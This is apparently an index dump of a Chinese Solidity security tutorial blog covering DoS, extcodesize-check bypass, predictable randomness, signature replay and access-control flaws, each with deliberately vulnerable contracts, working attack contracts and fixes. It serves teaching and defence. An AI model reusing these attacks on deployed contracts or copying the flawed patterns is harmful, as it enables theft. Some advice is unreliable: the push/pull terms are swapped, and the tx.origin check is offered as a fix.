交易所，为貔貅币创造流动性（v2），提供 10000貔貅币。和 0.1 ETH。 出售 100 貔貅币，能够操作成功。 切换到另一个账户，使用 0.01 ETH 购买貔貅币，能够操作成功。 出售貔貅币，无法弹出交易。 ","date":"2022-10-29","objectID":"/posts/solidity-smart-contract-security-honeypot-token.html:3:0","tags":["solidity","security","erc20","swap"],"title":"合约安全：貔貅 Honeypot Scam","uri":"/posts/solidity-smart-contract-security-honeypot-token.html"},{"categories":["合约安全"],"content":"4 预防方法 貔貅币是韭菜在链上梭哈最容易遇到的骗局，并且形式多变，预防非常有难度。我们有以下几点建议，可以降低被貔貅盘割韭菜的风险： 在区块链浏览器上（比如etherscan）查看合约是否开源，如果开源，则分析它的代码，看是否有貔貅漏洞。 如果没有编程能力，可以使用貔貅识别工具，比如 Token Sniffer 和 Ave Check，分低的话大概率是貔貅。 看项目是否有审计报告。 仔细检查项目的官网和社交媒体。 只投资你了解的项目，做好研究（DYOR）。 ","date":"2022-10-29","objectID":"/posts/solidity-smart-contract-security-honeypot-token.html:4:0","tags":["solidity","security","erc20","swap"],"title":"合约安全：貔貅 Honeypot Scam","uri":"/posts/solidity-smart-contract-security-honeypot-token.html"},{"categories":["合约安全"],"content":"5 总结 貔貅盘是每个韭菜必经之路，大家也对它恨之入骨。另外，最近也出现貔貅 NFT，恶意项目方通过修改 ERC721 的转账或授权函数，使得普通投资者不能出售它们。了解貔貅合约的原理和预防方法，可以显著减少你买到貔貅盘的概率，让你的资金更安全，大家要不断学习。 ","date":"2022-10-29","objectID":"/posts/solidity-smart-contract-security-honeypot-token.html:5:0","tags":["solidity","security","erc20","swap"],"title":"合约安全：貔貅 Honeypot Scam","uri":"/posts/solidity-smart-contract-security-honeypot-token.html"},{"categories":["合约安全"],"content":" 引言 智能合约的拒绝服务（Denial of Service, DoS）漏洞，并介绍预防的方法。NFT 项目 Akutar 曾因为 DoS 漏洞损失 11,539 ETH，当时价值 3400 万美元。 ","date":"2022-10-23","objectID":"/posts/solidity-smart-contract-security-dos-attack.html:0:0","tags":["solidity","security","fallback"],"title":"合约安全：拒绝服务漏洞","uri":"/posts/solidity-smart-contract-security-dos-attack.html"},{"categories":["合约安全"],"content":"1 DoS 在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。 在 2022 年 4 月，一个很火的 NFT 项目名为 Akutar，他们使用荷兰拍卖进行公开发行，筹集了 11,539.5 ETH，非常成功。之前持有他们社区 Pass 的参与者会得到 0.5 ETH 的退款，但是他们处理退款的时候，发现智能合约不能正常运行，全部资金被永远锁在了合约里。他们的智能合约有拒绝服务漏洞。 ","date":"2022-10-23","objectID":"/posts/solidity-smart-contract-security-dos-attack.html:1:0","tags":["solidity","security","fallback"],"title":"合约安全：拒绝服务漏洞","uri":"/posts/solidity-smart-contract-security-dos-attack.html"},{"categories":["合约安全"],"content":"2 漏洞例子 下面我们学习一个简化了的 Akutar 合约，名字叫 DoSGame。这个合约逻辑很简单，游戏开始时，玩家们调用 deposit() 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，refund()函数被调用，将 ETH 依次退款给所有玩家。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; // 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用deposit退钱。 contract DoSGame { bool public refundFinished; mapping(address =\u003e uint256) public balanceOf; address[] public players; // 所有玩家存ETH到合约里 function deposit() external payable { require(!refundFinished, \"Game Over\"); require(msg.value \u003e 0, \"Please donate ETH\"); // 记录存款 balanceOf[msg.sender] = msg.value; // 记录玩家地址 players.push(msg.sender); } // 游戏结束，退款开始，所有玩家将依次收到退款 function refund() external { require(!refundFinished, \"Game Over\"); uint256 pLength = players.length; // 通过循环给所有玩家退款 for(uint256 i; i \u003c pLength; i++){ address player = players[i]; uint256 refundETH = balanceOf[player]; (bool success, ) = player.call{value: refundETH}(\"\"); require(success, \"Refund Fail!\"); balanceOf[player] = 0; } refundFinished = true; } function balance() external view returns(uint256){ return address(this).balance; } } 这里的漏洞在于，refund() 函数中利用循环退款的时候，是使用的 call 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。 (bool success, ) = player.call{value: refundETH}(\"\"); 下面我们写个攻击合约， attack() 函数中将调用 DoSGame 合约的 deposit() 存款并参与游戏；fallback() 回调函数将回退所有向该合约发送ETH的交易，对DoSGame 合约中的 DoS 漏洞进行了攻击，所有退款将不能正常进行，资金被锁在合约中，就像 Akutar 合约中的一万多枚 ETH 一样。 contract Attack { // 退款时进行DoS攻击 fallback() external payable{ revert(\"DoS Attack!\"); } // 参与DoS游戏并存款 function attack(address gameAddr) external payable { DoSGame dos = DoSGame(gameAddr); dos.deposit{value: msg.value}(); } } ","date":"2022-10-23","objectID":"/posts/solidity-smart-contract-security-dos-attack.html:2:0","tags":["solidity","security","fallback"],"title":"合约安全：拒绝服务漏洞","uri":"/posts/solidity-smart-contract-security-dos-attack.html"},{"categories":["合约安全"],"content":"3 Remix复现 1. 部署 DoSGame 合约。 2. 调用 DoSGame 合约的 deposit()，进行存款并参与游戏。 3. 此时，如果游戏结束调用 refund() 退款的话是可以正常退款的。 4. 重新部署 DoSGame 合约，并部署 Attack 合约。 5. 调用 Attack 合约的 attack()，进行存款并参与游戏。 6. 调用 DoSGame 合约refund()，进行退款，发现不能正常运行，攻击成功。 ","date":"2022-10-23","objectID":"/posts/solidity-smart-contract-security-dos-attack.html:3:0","tags":["solidity","security","fallback"],"title":"合约安全：拒绝服务漏洞","uri":"/posts/solidity-smart-contract-security-dos-attack.html"},{"categories":["合约安全"],"content":"4 预防方法 很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方： 外部合约的函数调用（例如 call）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 require(success, \"Refund Fail!\"); 去掉，退款在单个地址失败时仍能继续运行。 合约不会出乎意料的自毁。 合约不会进入无限循环。 require 和 assert 的参数设定正确。 退款时，让用户从合约自行领取（push），而非批量发送给用户(pull)。 确保回调函数不会影响正常合约运行。 确保当合约的参与者（例如 owner）永远缺席时，合约的主要业务仍能顺利运行。 ","date":"2022-10-23","objectID":"/posts/solidity-smart-contract-security-dos-attack.html:4:0","tags":["solidity","security","fallback"],"title":"合约安全：拒绝服务漏洞","uri":"/posts/solidity-smart-contract-security-dos-attack.html"},{"categories":["合约安全"],"content":"5 总结 智能合约的拒绝服务漏洞，Akutar 项目因为该漏洞损失了一万多枚ETH。很多逻辑错误都能导致DoS，开发者写智能合约时要万分谨慎，比如退款要让用户自行领取，而非合约批量发送给用户。 ","date":"2022-10-23","objectID":"/posts/solidity-smart-contract-security-dos-attack.html:5:0","tags":["solidity","security","fallback"],"title":"合约安全：拒绝服务漏洞","uri":"/posts/solidity-smart-contract-security-dos-attack.html"},{"categories":["合约安全"],"content":"1 绕过合约检查 很多 freemint 的项目为了限制科学家（程序员）会用到 isContract() 方法，希望将调用者 msg.sender 限制为外部账户（EOA），而非合约。这个函数利用 extcodesize 获取该地址所存储的 bytecode 长度（runtime），若大于0，则判断为合约，否则就是EOA（用户）。 // 利用 extcodesize 检查是否为合约 function isContract(address account) public view returns (bool) { // extcodesize \u003e 0 的地址一定是合约地址 // 但是合约在构造函数时候 extcodesize 为0 uint size; assembly { size := extcodesize(account) } return size \u003e 0; } 这里有一个漏洞，就是在合约在被创建的时候，runtime bytecode 还没有被存储到地址上，因此 bytecode 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 constructor 中的话，就可以绕过 isContract() 检查。 ","date":"2022-10-20","objectID":"/posts/solidity-smart-contract-security-bad-constructor-check.html:1:0","tags":["solidity","security","constructor"],"title":"合约安全：绕过合约长度检查","uri":"/posts/solidity-smart-contract-security-bad-constructor-check.html"},{"categories":["合约安全"],"content":"2 漏洞复现 下面我们来看一个例子：ContractCheck合约是一个 freemint ERC20 合约，铸造函数 mint() 中使用了 isContract() 函数来阻止合约地址的调用，防止科学家批量铸造。每次调用 mint() 可以铸造 100 枚代币。 // 用extcodesize检查是否为合约地址 contract ContractCheck is ERC20 { // 构造函数：初始化代币名称和代号 constructor() ERC20(\"\", \"\") {} // 利用 extcodesize 检查是否为合约 function isContract(address account) public view returns (bool) { // extcodesize \u003e 0 的地址一定是合约地址 // 但是合约在构造函数时候 extcodesize 为0 uint size; assembly { size := extcodesize(account) } return size \u003e 0; } // mint函数，只有非合约地址能调用（有漏洞） function mint() public { require(!isContract(msg.sender), \"Contract not allowed!\"); _mint(msg.sender, 100); } } 我们写一个攻击合约，在 constructor 中多次调用 ContractCheck 合约中的 mint() 函数，批量铸造 1000 枚代币： // 利用构造函数的特点攻击 contract NotContract { bool public isContract; address public contractCheck; // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。 constructor(address addr) { contractCheck = addr; isContract = ContractCheck(addr).isContract(address(this)); // This will work for(uint i; i \u003c 10; i++){ ContractCheck(addr).mint(); } } // 合约创建好以后，extcodesize \u003e 0，isContract() 可以检测 function mint() external { ContractCheck(contractCheck).mint(); } } 如果我们之前讲的是正确的话，在构造函数调用 mint() 可以绕过 isContract() 的检查成功铸造代币，那么函数将成功部署，并且状态变量 isContract 会在构造函数赋值 false。而在合约部署之后，runtime bytecode 已经被存储在合约地址上了，extcodesize \u003e 0， isContract() 能够成功阻止铸造，调用 mint() 函数将失败。 ","date":"2022-10-20","objectID":"/posts/solidity-smart-contract-security-bad-constructor-check.html:2:0","tags":["solidity","security","constructor"],"title":"合约安全：绕过合约长度检查","uri":"/posts/solidity-smart-contract-security-bad-constructor-check.html"},{"categories":["合约安全"],"content":"3 Remix复现 部署 ContractCheck 合约。 部署 NotContract 合约，参数为 ContractCheck 合约地址。 调用 ContractCheck 合约的 balanceOf 查看 NotContract 合约的代币余额为 1000，攻击成功。 调用NotContract 合约的 mint() 函数，由于此时合约已经部署完成，调用 mint() 函数将失败。 ","date":"2022-10-20","objectID":"/posts/solidity-smart-contract-security-bad-constructor-check.html:3:0","tags":["solidity","security","constructor"],"title":"合约安全：绕过合约长度检查","uri":"/posts/solidity-smart-contract-security-bad-constructor-check.html"},{"categories":["合约安全"],"content":"4 预防办法 你可以使用 (tx.origin == msg.sender) 来检测调用者是否为合约。如果调用者为 EOA，那么tx.origin和msg.sender相等；如果它们俩不相等，调用者为合约。 function realContract(address account) public view returns (bool) { return (tx.origin == msg.sender); } ","date":"2022-10-20","objectID":"/posts/solidity-smart-contract-security-bad-constructor-check.html:4:0","tags":["solidity","security","constructor"],"title":"合约安全：绕过合约长度检查","uri":"/posts/solidity-smart-contract-security-bad-constructor-check.html"},{"categories":["合约安全"],"content":"5 总结 如果一个地址的 extcodesize \u003e 0，则该地址一定为合约；但如果 extcodesize = 0，该地址既可能为 EOA，也可能为正在创建状态的合约。 ","date":"2022-10-20","objectID":"/posts/solidity-smart-contract-security-bad-constructor-check.html:5:0","tags":["solidity","security","constructor"],"title":"合约安全：绕过合约长度检查","uri":"/posts/solidity-smart-contract-security-bad-constructor-check.html"},{"categories":["合约安全"],"content":" 引言 智能合约的坏随机数（Bad Randomness）漏洞和预防方法，这个漏洞经常在 NFT 和 GameFi 中出现，包括 Meebits，Loots，Wolf Game等。 ","date":"2022-10-11","objectID":"/posts/solidity-smart-contract-security-bad-random-number.html:0:0","tags":["solidity","security","random"],"title":"合约安全：坏随机数","uri":"/posts/solidity-smart-contract-security-bad-random-number.html"},{"categories":["合约安全"],"content":"1 伪随机数 很多以太坊上的应用都需要用到随机数，例如NFT随机抽取tokenId、抽盲盒、gamefi战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（public）且确定性（deterministic）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如random()。很多项目方不得不使用链上的伪随机数生成方法，例如 blockhash() 和 keccak256() 方法。 坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有NFT而非随机抽取。。 ","date":"2022-10-11","objectID":"/posts/solidity-smart-contract-security-bad-random-number.html:1:0","tags":["solidity","security","random"],"title":"合约安全：坏随机数","uri":"/posts/solidity-smart-contract-security-bad-random-number.html"},{"categories":["合约安全"],"content":"2 坏随机数案例 下面我们学习一个有坏随机数漏洞的 NFT 合约： BadRandomness.sol。 contract BadRandomness is ERC721 { uint256 totalSupply; // 构造函数，初始化NFT合集的名称、代号 constructor() ERC721(\"\", \"\"){} // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint function luckyMint(uint256 luckyNumber) external { uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number require(randomNumber == luckyNumber, \"Better luck next time!\"); _mint(msg.sender, totalSupply); // mint totalSupply++; } } 它有一个主要的铸造函数 luckyMint()，用户调用时输入一个 0-99 的数字，如果和链上生成的伪随机数 randomNumber 相等，即可铸造幸运 NFT。伪随机数使用 blockhash 和 block.timestamp 声称。这个漏洞在于用户可以完美预测生成的随机数并铸造NFT。 下面我们写个攻击合约 Attack.sol。 contract Attack { function attackMint(BadRandomness nftAddr) external { // 提前计算随机数 uint256 luckyNumber = uint256( keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)) ) % 100; // 利用 luckyNumber 攻击 nftAddr.luckyMint(luckyNumber); } } 攻击函数 attackMint()中的参数为 BadRandomness合约地址。在其中，我们计算了随机数 luckyNumber，然后将它作为参数输入到 luckyMint() 函数完成攻击。由于attackMint()和luckyMint()将在同一个区块中调用，blockhash和block.timestamp是相同的，利用他们生成的随机数也相同。 ","date":"2022-10-11","objectID":"/posts/solidity-smart-contract-security-bad-random-number.html:2:0","tags":["solidity","security","random"],"title":"合约安全：坏随机数","uri":"/posts/solidity-smart-contract-security-bad-random-number.html"},{"categories":["合约安全"],"content":"3 Remix复现 由于 Remix 自带的 Remix VM不支持 blockhash函数，因此你需要将合约部署到以太坊测试链上进行复现。 部署 BadRandomness 合约。 部署 Attack 合约。 将 BadRandomness 合约地址作为参数传入到 Attack 合约的 attackMint() 函数并调用，完成攻击。 调用 BadRandomness 合约的 balanceOf 查看Attack 合约NFT余额，确认攻击成功。 ","date":"2022-10-11","objectID":"/posts/solidity-smart-contract-security-bad-random-number.html:3:0","tags":["solidity","security","random"],"title":"合约安全：坏随机数","uri":"/posts/solidity-smart-contract-security-bad-random-number.html"},{"categories":["合约安全"],"content":"4 预防方法 我们通常使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。这类随机数从链下生成，然后上传到链上，从而保证随机数不可预测。。 ","date":"2022-10-11","objectID":"/posts/solidity-smart-contract-security-bad-random-number.html:4:0","tags":["solidity","security","random"],"title":"合约安全：坏随机数","uri":"/posts/solidity-smart-contract-security-bad-random-number.html"},{"categories":["合约安全"],"content":"5 总结 这一讲我们介绍了坏随机数漏洞，并介绍了一个简单的预防方法：使用预言机项目提供的链下随机数。NFT 和 GameFi 项目方应避免使用链上伪随机数进行抽奖，以防被黑客利用。 ","date":"2022-10-11","objectID":"/posts/solidity-smart-contract-security-bad-random-number.html:5:0","tags":["solidity","security","random"],"title":"合约安全：坏随机数","uri":"/posts/solidity-smart-contract-security-bad-random-number.html"},{"categories":["合约安全"],"content":" 引言 智能合约的签名重放（Signature Replay）攻击和预防方法，它曾间接导致了著名做市商 Wintermute 被盗2000万枚 $OP。 ","date":"2022-09-19","objectID":"/posts/solidity-smart-contract-security-signature-replay.html:0:0","tags":["solidity","security","signature"],"title":"合约安全：签名重放","uri":"/posts/solidity-smart-contract-security-signature-replay.html"},{"categories":["合约安全"],"content":"1 签名重放 上学的时候，老师经常会让家长签字，有时候家长很忙，我就会很“贴心”照着以前的签字抄一遍。某种意义上来说，这就是签名重放。 在区块链中，数字签名可以用于识别数据签名者和验证数据完整性。发送交易时，用户使用私钥签名交易，使得其他人可以验证交易是由相应账户发出的。智能合约也能利用 ECDSA 算法验证用户将在链下创建的签名，然后执行铸造或转账等逻辑。 数字签名一般有两种常见的重放攻击： 普通重放：将本该使用一次的签名多次使用。NBA官方发布的《The Association》系列 NFT 因为这类攻击被免费铸造了上万枚。 跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。做市商 Wintermute 因为跨链重放攻击被盗2000万枚 $OP。 ","date":"2022-09-19","objectID":"/posts/solidity-smart-contract-security-signature-replay.html:1:0","tags":["solidity","security","signature"],"title":"合约安全：签名重放","uri":"/posts/solidity-smart-contract-security-signature-replay.html"},{"categories":["合约安全"],"content":"2 漏洞合约复现 下面的SigReplay合约是一个ERC20代币合约，它的铸造函数有签名重放漏洞。它使用链下签名让白名单地址 to 铸造相应数量 amount 的代币。合约中保存了 signer 地址，来验证签名是否有效。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; import \"@openzeppelin/contracts/access/Ownable.sol\"; import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\"; // 权限管理错误例子 contract SigReplay is ERC20 { address public signer; // 构造函数：初始化代币名称和代号 constructor() ERC20(\"SigReplay\", \"Replay\") { signer = msg.sender; } /** * 有签名重放漏洞的铸造函数 * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 * amount: 1000 * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b */ function badMint(address to, uint amount, bytes memory signature) public { bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount)); require(verify(_msgHash, signature), \"Invalid Signer!\"); _mint(to, amount); } /** * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 * amount: 1000 * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be */ function getMessageHash(address to, uint256 amount) public pure returns(bytes32){ return keccak256(abi.encodePacked(to, amount)); } /** * @dev 获得以太坊签名消息 * `hash`：消息哈希 * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`] * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191` * 添加\"\\x19Ethereum Signed Message:\\n32\"字段，防止签名的是可执行交易。 */ function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) { // 32 is the length in bytes of hash, // enforced by the type signature above return keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)); } // ECDSA验证 function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool){ return ECDSA.recover(_msgHash, _signature) == signer; } 注意 铸造函数 badMint() 没有对 signature 查重，导致同样的签名可以多次使用，无限铸造代币。 function badMint(address to, uint amount, bytes memory signature) public { bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount))); require(verify(_msgHash, signature), \"Invalid Signer!\"); _mint(to, amount); } ","date":"2022-09-19","objectID":"/posts/solidity-smart-contract-security-signature-replay.html:2:0","tags":["solidity","security","signature"],"title":"合约安全：签名重放","uri":"/posts/solidity-smart-contract-security-signature-replay.html"},{"categories":["合约安全"],"content":"3 Remix复现 1. 部署 SigReplay 合约，签名者地址 signer 被初始化为部署钱包地址。 2. 利用getMessageHash函数获取消息。 3. 点击 Remix 部署面板的签名按钮，使用私钥给消息签名。 4. 反复调用 badMint 进行签名重放攻击，铸造大量代币。 ","date":"2022-09-19","objectID":"/posts/solidity-smart-contract-security-signature-replay.html:3:0","tags":["solidity","security","signature"],"title":"合约安全：签名重放","uri":"/posts/solidity-smart-contract-security-signature-replay.html"},{"categories":["合约安全"],"content":"4 预防办法 签名重放攻击主要有两种预防办法： 将使用过的签名记录下来，比如记录下已经铸造代币的地址 mintedAddress，防止签名反复使用： mapping(address =\u003e bool) public mintedAddress; // 记录已经mint的地址 function goodMint(address to, uint amount, bytes memory signature) public { bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount)); require(verify(_msgHash, signature), \"Invalid Signer!\"); // 检查该地址是否mint过 require(!mintedAddress[to], \"Already minted\"); // 记录mint过的地址 mintedAddress[to] = true; _mint(to, amount); } 将 nonce （数值随每次交易递增）和 chainid （链ID）包含在签名消息中，这样可以防止普通重放和跨链重放攻击： uint nonce; function nonceMint(address to, uint amount, bytes memory signature) public { bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid))); require(verify(_msgHash, signature), \"Invalid Signer!\"); _mint(to, amount); nonce++; } ","date":"2022-09-19","objectID":"/posts/solidity-smart-contract-security-signature-replay.html:4:0","tags":["solidity","security","signature"],"title":"合约安全：签名重放","uri":"/posts/solidity-smart-contract-security-signature-replay.html"},{"categories":["合约安全"],"content":"5 总结 介绍了智能合约中的签名重放漏洞，并介绍了两个预防方法： 将使用过的签名记录下来，防止二次使用。 将 nonce 和 chainid 包含到签名消息中。 ","date":"2022-09-19","objectID":"/posts/solidity-smart-contract-security-signature-replay.html:5:0","tags":["solidity","security","signature"],"title":"合约安全：签名重放","uri":"/posts/solidity-smart-contract-security-signature-replay.html"},{"categories":["合约安全"],"content":" 引言 智能合约的权限管理漏洞。这个漏洞导致了跨链桥 Poly Network 被黑 6.11 亿美元，并导致了BSC上DeFi项目 ShadowFi 被黑 $300,000。 ","date":"2022-09-10","objectID":"/posts/solidity-smart-contract-security-access-control-exploit.html:0:0","tags":["solidity","security","modifier","erc20"],"title":"合约安全：权限管理漏洞","uri":"/posts/solidity-smart-contract-security-access-control-exploit.html"},{"categories":["合约安全"],"content":"1 权限管理漏洞 智能合约中的权限管理定义了不同角色在应用中的权限。通常来说，代币的铸造、提取资金、暂停等功能都需要较高权限的用户才能调用。如果权限配置错误，就可能造成意想不到的损失。下面我们介绍两种常见的权限管理漏洞。 ","date":"2022-09-10","objectID":"/posts/solidity-smart-contract-security-access-control-exploit.html:1:0","tags":["solidity","security","modifier","erc20"],"title":"合约安全：权限管理漏洞","uri":"/posts/solidity-smart-contract-security-access-control-exploit.html"},{"categories":["合约安全"],"content":"1.1 权限配置错误 如果合约中特殊功能没有加上权限管理，那么任何人都能铸造大量代币或将合约中的资金提光。跨链桥 Poly Network 的合约中转移守护者的函数没有配置相应权限，被黑客改为自己的地址，从而提走了合约中的 6.11 亿美元。 在下面的代码中，mint()函数没有进行权限管理，那么任何人都可以调用它铸造代币。 // 错误的mint函数，没有限制权限 function badMint(address to, uint amount) public { _mint(to, amount); } ","date":"2022-09-10","objectID":"/posts/solidity-smart-contract-security-access-control-exploit.html:1:1","tags":["solidity","security","modifier","erc20"],"title":"合约安全：权限管理漏洞","uri":"/posts/solidity-smart-contract-security-access-control-exploit.html"},{"categories":["合约安全"],"content":"1.2 授权检查错误 另一类常见的权限管理漏洞是没有在函数中检查调用者是否拥有足够的授权。BSC上DeFi项目 ShadowFi 的代币合约忘了在 burn() 销毁函数中检查调用者的授权额度，导致攻击者可以任意的销毁其他地址的代币。在黑客将流动性池子中的代币销毁之后，仅需卖出一点代币就可以将池子里的所有 BNB 提走，获利 $300,000。 // 错误的burn函数，没有限制权限 function badBurn(address account, uint amount) public { _burn(account, amount); } ","date":"2022-09-10","objectID":"/posts/solidity-smart-contract-security-access-control-exploit.html:1:2","tags":["solidity","security","modifier","erc20"],"title":"合约安全：权限管理漏洞","uri":"/posts/solidity-smart-contract-security-access-control-exploit.html"},{"categories":["合约安全"],"content":"3 预防办法 权限管理漏洞主要有两种预防办法： 使用 Openzeppelin 的权限管理库给合约的特殊函数配置相应的权限，比如使用OnlyOwner修饰器，只有合约所有者才能调用。 // 正确的mint函数，使用 onlyOwner 修饰器限制权限 function goodMint(address to, uint amount) public onlyOwner { _mint(to, amount); } 在函数的逻辑中确保合约调用者拥有足够的授权。 // 正确的burn函数，如果销毁的不是自己的代币，则会检查授权 function goodBurn(address account, uint amount) public { if(msg.sender != account){ _spendAllowance(account, msg.sender, amount); } _burn(account, amount); } ","date":"2022-09-10","objectID":"/posts/solidity-smart-contract-security-access-control-exploit.html:2:0","tags":["solidity","security","modifier","erc20"],"title":"合约安全：权限管理漏洞","uri":"/posts/solidity-smart-contract-security-access-control-exploit.html"},{"categories":["合约安全"],"content":"4 总结 介绍了智能合约中的权限管理漏洞。它主要有两种形式：权限配置错误和授权检查错误。为了避免这类漏洞，我们要使用权限管理库给特殊函数配置相应的权限，并且在函数的逻辑中确保合约调用者拥有足够的授权。 ","date":"2022-09-10","objectID":"/posts/solidity-smart-contract-security-access-control-exploit.html:3:0","tags":["solidity","security","modifier","erc20"],"title":"合约安全：权限管理漏洞","uri":"/posts/solidity-smart-contract-security-access-control-exploit.html"},{"categories":["基础知识","Solidity 应用"],"content":" 引言 ERC1155标准，它支持一个合约包含多种代币。并且，我们会发行一个魔改的无聊猿 - BAYC1155：它包含10,000种代币，且元数据与BAYC一致。 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:0:0","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"EIP1155 不论是ERC20还是ERC721标准，每个合约都对应一个独立的代币。假设我们要在以太坊上打造一个类似《魔兽世界》的大型游戏，这需要我们对每个装备都部署一个合约。上千种装备就要部署和管理上千个合约，这非常麻烦。因此，以太坊EIP1155提出了一个多代币标准ERC1155，允许一个合约包含多个同质化和非同质化代币。ERC1155在GameFi应用最多，Decentraland、Sandbox等知名链游都使用它。 简单来说，ERC1155与之前介绍的非同质化代币标准ERC721类似：在ERC721中，每个代币都有一个tokenId作为唯一标识，每个tokenId只对应一个代币；而在ERC1155中，每一种代币都有一个id作为唯一标识，每个id对应一种代币。这样，代币种类就可以非同质的在同一个合约里管理了，并且每种代币都有一个网址uri来存储它的元数据，类似ERC721的tokenURI。下面是ERC1155的元数据接口合约IERC1155MetadataURI： /** * @dev ERC1155的可选接口，加入了uri()函数查询元数据 */ interface IERC1155MetadataURI is IERC1155 { /** * @dev 返回第`id`种类代币的URI */ function uri(uint256 id) external view returns (string memory); 那么怎么区分ERC1155中的某类代币是同质化还是非同质化代币呢？其实很简单：如果某个id对应的代币总量为1，那么它就是非同质化代币，类似ERC721；如果某个id对应的代币总量大于1，那么他就是同质化代币，因为这些代币都分享同一个id，类似ERC20。 ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:1:0","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"IERC1155接口合约 IERC1155接口合约抽象了EIP1155需要实现的功能，其中包含4个事件和6个函数。与ERC721不同，因为ERC1155包含多类代币，它实现了批量转账和批量余额查询，一次操作多种代币。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; /** * @dev ERC165标准接口, 详见 * https://eips.ethereum.org/EIPS/eip-165[EIP]. * * 合约可以声明支持的接口，供其他合约检查 * */ interface IERC165 { /** * @dev 如果合约实现了查询的`interfaceId`，则返回true * 规则详见：https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section] * */ function supportsInterface(bytes4 interfaceId) external view returns (bool); } // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"./IERC165.sol\"; /** * @dev ERC1155标准的接口合约，实现了EIP1155的功能 * 详见：https://eips.ethereum.org/EIPS/eip-1155[EIP]. */ interface IERC1155 is IERC165 { /** * @dev 单类代币转账事件 * 当`value`个`id`种类的代币被`operator`从`from`转账到`to`时释放. */ event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value); /** * @dev 批量代币转账事件 * ids和values为转账的代币种类和数量数组 */ event TransferBatch( address indexed operator, address indexed from, address indexed to, uint256[] ids, uint256[] values ); /** * @dev 批量授权事件 * 当`account`将所有代币授权给`operator`时释放 */ event ApprovalForAll(address indexed account, address indexed operator, bool approved); /** * @dev 当`id`种类的代币的URI发生变化时释放，`value`为新的URI */ event URI(string value, uint256 indexed id); /** * @dev 持仓查询，返回`account`拥有的`id`种类的代币的持仓量 */ function balanceOf(address account, uint256 id) external view returns (uint256); /** * @dev 批量持仓查询，`accounts`和`ids`数组的长度要想等。 */ function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids) external view returns (uint256[] memory); /** * @dev 批量授权，将调用者的代币授权给`operator`地址。 * 释放{ApprovalForAll}事件. */ function setApprovalForAll(address operator, bool approved) external; /** * @dev 批量授权查询，如果授权地址`operator`被`account`授权，则返回`true` * 见 {setApprovalForAll}函数. */ function isApprovedForAll(address account, address operator) external view returns (bool); /** * @dev 安全转账，将`amount`单位`id`种类的代币从`from`转账给`to`. * 释放{TransferSingle}事件. * 要求: * - 如果调用者不是`from`地址而是授权地址，则需要得到`from`的授权 * - `from`地址必须有足够的持仓 * - 如果接收方是合约，需要实现`IERC1155Receiver`的`onERC1155Received`方法，并返回相应的值 */ function safeTransferFrom( address from, address to, uint256 id, uint256 amount, bytes calldata data ) external; /** * @dev 批量安全转账 * 释放{TransferBatch}事件 * 要求： * - `ids`和`amounts`长度相等 * - 如果接收方是合约，需要实现`IERC1155Receiver`的`onERC1155BatchReceived`方法，并返回相应的值 */ function safeBatchTransferFrom( address from, address to, uint256[] calldata ids, uint256[] calldata amounts, bytes calldata data ) external; } ","date":"2022-09-07","objectID":"/posts/solidity-erc1155.html:2:0","tags":["solidity","basic"],"title":"GameFi中常见的ERC1155代币标准","uri":"/posts/solidity-erc1155.html"},{"categories":["基础知识","Solidity 应用"],"content":"IERC1155事件 TransferSingle事件：单类代币转账事件，在单币种转账时释放。 